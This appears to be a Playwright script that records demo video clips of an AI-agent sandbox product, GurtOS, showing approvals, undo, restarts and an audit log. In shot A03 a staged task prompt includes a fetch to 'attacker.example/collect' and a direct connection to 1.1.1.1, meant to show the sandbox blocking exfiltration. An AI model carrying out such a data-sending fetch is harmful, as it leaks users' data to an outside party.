// The shared shots (capture.md, section A) against the clip box, in a headed full-screen browser. Run each one
// inside x11rec.sh so it is recorded at 1920x1080 and 60 fps:
//   showcase/scripts/clips/clip-box.sh                      # a fresh clip box on the test VM (port 7795)
//   PLAYWRIGHT=<path to playwright/index.mjs> docs/video/capture/x11rec.sh a03.mp4 node docs/video/capture/shots.mjs A03
// Steps and selectors follow showcase/scripts/clips/record.mjs (the showcase's 1600x900 clips), at video size.
// shortcut: helpers are copied from record.mjs because it runs on import; fold them together if both keep changing.
import { execFileSync } from 'node:child_process';
import path from 'node:path';

const { chromium } = await import(process.env.PLAYWRIGHT ?? 'playwright');
const BOX = process.env.BOX ?? 'http://127.0.0.1:7795';
const BOXSH = path.resolve(import.meta.dirname, '../../../showcase/scripts/clips/clip-box.sh');
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const api = async (method, p, body) => {
  const r = await fetch(BOX + p, { method, headers: { 'content-type': 'application/json' }, body: body && JSON.stringify(body) });
  if (!r.ok) throw new Error(`${method} ${p}: ${r.status} ${await r.text()}`);
  return r.json();
};
const task = (spec) => api('POST', '/api/tasks', { worker: 'fake', source: 'portal', ...spec });
const state = async (id) => (await api('GET', `/api/tasks/${id}`)).task.state;
const until = async (fn, ms = 30000) => {
  for (const end = Date.now() + ms; Date.now() < end; await wait(300)) if (await fn()) return;
  throw new Error('timed out waiting');
};

// A visible pointer, 4% of the frame wide (x11grab records no cursor).
const CURSOR = () => {
  if (window.top !== window) return;
  const put = () => {
    const d = document.createElement('div');
    d.id = '__cursor';
    d.style.cssText = 'position:fixed;left:-60px;top:-60px;width:34px;height:34px;margin:-17px 0 0 -17px;border-radius:50%;' +
      'background:rgba(242,239,232,.55);border:3px solid #1c201d;box-shadow:0 0 0 3px rgba(242,239,232,.8);z-index:2147483647;pointer-events:none;transition:transform .12s';
    document.documentElement.appendChild(d);
    window.__cur = (x, y, down) => { d.style.left = x + 'px'; d.style.top = y + 'px'; d.style.transform = down ? 'scale(.7)' : 'scale(1)'; };
  };
  document.readyState === 'loading' ? addEventListener('DOMContentLoaded', put) : put();
};

async function open(url = '/screen') {
  const ctx = await chromium.launchPersistentContext(`/tmp/gurtos-shots-${process.pid}`, {
    headless: false, viewport: null,
    args: ['--kiosk', '--window-position=0,0', '--window-size=1920,1080', '--disable-gpu', '--ozone-platform=x11',
      '--no-first-run', '--hide-scrollbars', '--force-dark-mode'],
  });
  await ctx.addInitScript(CURSOR);
  const page = ctx.pages()[0] ?? (await ctx.newPage());
  page.pos = { x: 1190, y: 760 };
  await page.goto(BOX + url);
  await page.waitForTimeout(2500);
  await page.evaluate(({ x, y }) => window.__cur?.(x, y), page.pos);
  return page;
}

async function moveTo(page, x, y, ms = 700) {
  const n = Math.max(8, Math.round(ms / 16)), { x: x0, y: y0 } = page.pos;
  for (let i = 1; i <= n; i++) {
    const t = i / n, e = t < 0.5 ? 2 * t * t : 1 - (-2 * t + 2) ** 2 / 2;
    const xi = x0 + (x - x0) * e, yi = y0 + (y - y0) * e;
    await page.mouse.move(xi, yi);
    await page.evaluate(([a, b]) => window.__cur?.(a, b), [xi, yi]);
    await page.waitForTimeout(ms / n);
  }
  page.pos = { x, y };
}

async function click(page, loc, { pause = 350 } = {}) {
  if (typeof loc === 'string') loc = page.locator(loc).first();
  await loc.waitFor({ state: 'visible', timeout: 30000 });
  await loc.scrollIntoViewIfNeeded();
  const b = await loc.boundingBox();
  await moveTo(page, b.x + b.width / 2, b.y + b.height / 2);
  await page.waitForTimeout(pause);
  await page.evaluate(([a, b2]) => window.__cur?.(a, b2, true), [page.pos.x, page.pos.y]);
  await loc.click();
  await page.waitForTimeout(140);
  await page.evaluate(([a, b2]) => window.__cur?.(a, b2, false), [page.pos.x, page.pos.y]);
}

const glide = async (page, loc, dx = 0.5, dy = 0.5, ms = 900) => {
  const b = await loc.boundingBox({ timeout: 5000 }).catch(() => null);
  if (b) await moveTo(page, b.x + b.width * dx, b.y + b.height * dy, ms);
};
const dock = (page, label) => page.locator(`.gos-dock-item[aria-label^="${label}"], .gos-dock-item[title^="${label}"]`).first();
const banner = (page, text) => page.locator('.gos-banners .gos-note', { hasText: text }).first();
const done = (page) => page.context().close();
async function asPerson(name, url = '/screen') {
  const page = await open(url);
  await click(page, page.getByRole('button', { name: /Sign in as a person|Signed in as/ }).first());
  await click(page, page.getByRole('menuitem', { name: new RegExp(`^${name}`) }).first());
  await page.waitForTimeout(1500);
  return page;
}

const shots = {
  // Box screen at rest, lived in.
  async A01() {
    const page = await open();
    await page.waitForTimeout(15000);
    await done(page);
  },

  // Moment 3, box side. The phone side is D01 on the iPhone simulator, aligned on the banner's first frame.
  async A02() {
    const page = await open();
    await page.waitForTimeout(1500);
    await task({ title: 'Buy a GPU hour', tools: ['example.spend'], budgetCents: 500,
      prompt: 'call example.spend {"cents":800,"on":"a GPU hour"}\nwrite gpu.txt booked' });
    const n = banner(page, 'Buy a GPU hour');
    await n.waitFor({ timeout: 30000 });
    await page.waitForTimeout(3000);
    // Rehearsal stands in for the phone's tap; the real take approves on the phone.
    const pend = await api('GET', '/api/approvals?state=pending');
    for (const a of pend) await api('POST', `/api/approvals/${encodeURIComponent(a.id)}`, { approved: true, by: 'phone' }).catch(() => {});
    await page.waitForTimeout(4000);
    await done(page);
  },

  // Moment 2: the booby-trapped page, blocked, opened, undone.
  async A03() {
    const page = await open();
    await page.waitForTimeout(1500);
    await task({ title: 'Find me a road bike', workspace: 'notes', hosts: ['example.com'],
      prompt: 'fetch http://example.com/ page.html\nsleep 3\nfetch https://attacker.example/collect exfil.txt\nconnect 1.1.1.1:443 direct.txt\nwrite bikes.md Two road bikes under 600 dollars.' });
    const n = banner(page, /blocked/i);
    await n.waitFor({ timeout: 30000 });
    await page.waitForTimeout(800);
    await glide(page, n, 0.5, 0.45);
    await page.waitForTimeout(2500);
    await click(page, n.locator('.gos-two'));
    await page.waitForTimeout(2000);
    await glide(page, page.getByText(/not allowed to do/).first(), 0.4, 0.5);
    await page.waitForTimeout(3000);
    await glide(page, page.getByText(/^Blocked:/).first(), 0.4, 0.5, 800);
    await page.waitForTimeout(2500);
    const undo = page.getByRole('button', { name: 'Undo task', exact: true }).last();
    if (await undo.count()) {
      await click(page, undo);
      await page.waitForTimeout(1200);
      await click(page, page.locator('dialog .g-alert-actions button').last());
    }
    await page.waitForTimeout(3000);
    await done(page);
  },

  // Moment 1: two tasks on one workspace, undo one in Time Machine.
  async A04() {
    const a = await task({ title: 'Write the weekly notes', workspace: 'notes', prompt: 'write notes.md # Notes\nappend notes.md Groceries came in under budget.' });
    await until(async () => (await state(a.id)) === 'done');
    const b = await task({ title: 'Rename the photo folders', workspace: 'notes', prompt: 'write photos.txt renamed 212 folders' });
    await until(async () => (await state(b.id)) === 'done');
    const page = await open();
    await click(page, dock(page, 'Time Machine'));
    await page.waitForTimeout(1500);
    const ws = page.locator('.g-sidebar-item', { hasText: 'notes' });
    if (await ws.count()) await click(page, ws.first());
    await page.waitForTimeout(1200);
    const layer = page.locator('.gos-w-layer', { hasText: 'Rename the photo folders' });
    await click(page, layer);
    await page.waitForTimeout(2500);
    await click(page, page.getByRole('button', { name: /^Undo/ }).last());
    await page.waitForTimeout(1200);
    const confirm = page.locator('dialog .g-alert-actions button').last();
    if (await confirm.count()) await click(page, confirm);
    await page.waitForTimeout(3500);
    await done(page);
  },

  // Moment 4: a long task, the plug pulled, the box back with "Welcome back".
  async A05() {
    const lines = Array.from({ length: 60 }, (_, i) => `append albums.txt album ${i + 1} counted\nsleep 1`).join('\n');
    await task({ title: 'Count the photo albums', prompt: lines });
    await wait(2500);
    const page = await open();
    await glide(page, page.locator('.gos-widget-card', { hasText: 'Running' }), 0.5, 0.7);
    await page.waitForTimeout(3500);
    execFileSync(BOXSH, ['kill'], { stdio: 'inherit' });
    await page.waitForTimeout(5000);
    execFileSync(BOXSH, ['boot'], { stdio: 'inherit' });
    await page.getByText('Welcome back').first().waitFor({ timeout: 40000 });
    await page.waitForTimeout(5000);
    await done(page);
  },

  // A finished task's page: what it could reach, its own box- user, its cost.
  async A06() {
    const t = await task({ title: 'Tidy the receipts', workspace: 'notes', hosts: ['example.com'], prompt: 'fetch http://example.com/ page.html\nwrite receipts.md 14 receipts filed.' });
    await until(async () => ['done', 'failed'].includes(await state(t.id)));
    const page = await open(`/screen#task/${t.id}`);
    await page.waitForTimeout(2000);
    const reach = page.getByText(/What it can reach|It could reach/).first();
    await reach.scrollIntoViewIfNeeded().catch(() => {});
    await glide(page, reach, 0.3, 0.5);
    await page.waitForTimeout(4000);
    await done(page);
  },

  // Business shots need seed-business.ts first. The box screen answers nothing until a person is picked.
  async A30() {
    const page = await asPerson('Rosa Delgado');
    await click(page, dock(page, 'Waiting for me'));
    await page.waitForTimeout(2000);
    await click(page, page.getByText('APP-1042').first());
    await page.waitForTimeout(4000);
    await done(page);
  },
  async A31() {
    const page = await asPerson('Priya Nair', '/screen#settings/people');
    await page.waitForTimeout(5000);
    await done(page);
  },
  async A32() {
    // Rosa's own $12,000 request: GurtOS shows nobody may approve it, Rosa included.
    const page = await asPerson('Rosa Delgado');
    await click(page, dock(page, 'Waiting for me'));
    await page.waitForTimeout(1500);
    await click(page, page.getByText('APP-1048').first());
    await page.waitForTimeout(4000);
    await done(page);
  },
  async A33() {
    const page = await asPerson('Owen Clarke', '/screen#audit');
    await page.waitForTimeout(2500);
    await glide(page, page.getByText('Export CSV').first(), 0.5, 0.5);
    await page.waitForTimeout(3000);
    await done(page);
  },
  async A34() {
    const page = await asPerson('Priya Nair', '/screen#settings/kill-switch');
    await page.waitForTimeout(2500);
    await glide(page, page.getByRole('button', { name: /Pause all agents/ }).first(), 0.5, 0.5);
    await page.waitForTimeout(3000); // the real take presses it with 10 tasks running, then POST /api/drill
    await done(page);
  },

  // Activity: the action log, then filtered to one task.
  async A08() {
    const page = await open();
    await click(page, dock(page, 'Activity'));
    await page.waitForTimeout(2000);
    for (let i = 0; i < 20; i++) { await page.mouse.wheel(0, 60); await page.waitForTimeout(120); }
    await page.waitForTimeout(3000);
    await done(page);
  },
};

const want = process.argv.slice(2);
if (!want.length || want.some((s) => !shots[s])) {
  console.error(`usage: shots.mjs <${Object.keys(shots).join('|')}>`);
  process.exit(2);
}
for (const s of want) { await shots[s](); console.log('shot', s, 'ok'); }
